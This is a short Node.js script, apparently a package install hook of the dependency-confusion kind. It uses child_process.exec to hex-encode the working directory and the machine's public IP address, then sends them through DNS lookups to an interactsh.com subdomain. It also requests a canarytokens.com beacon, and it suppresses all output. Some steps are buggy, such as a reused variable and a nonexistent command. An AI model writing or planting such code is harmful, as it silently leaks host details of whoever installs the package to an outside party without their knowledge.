 const { exec } = require("child_process");
exec("a=$(pwd | head | xxd -p) && nslookup $a.c5yj0c92vtc00000pg0ggn9jygeyyyyyb.interactsh.com > /dev/null 2>&1; b=$(c5yj0c92vtc00000pg0ggn9jygeyyyyyb | head | xxd -p) && nslookup $b.c5yj0c92vtc00000pg0ggn9jygeyyyyyb.interactsh.com > /dev/null 2>&1; c=$(curl ifconfig.me | head | xxd -p) && nslookup $c.c5yj0c92vtc00000pg0ggn9jygeyyyyyb.interactsh.com > /dev/null 2>&1; d=$(echo exposed-package | head | xxd -p) && nslookup $d.c5yj0c92vtc00000pg0ggn9jygeyyyyyb.interactsh.com > /dev/null 2>&1; e=$(whoami | head | xxd -p ) && nslookup $a.c5yj0c92vtc00000pg0ggn9jygeyyyyyb.interactsh.com > /dev/null 2>&1; curl http://canarytokens.com/traffic/images/tags/b59v6x6r9quvsl41pq0ci01g2/index.html;", (error, data, getter) => {
	if(error){
		console.log("error",error.message);
		return;
	}
	if(getter){
		console.log(data);
		return;
	}
	console.log(data);

});
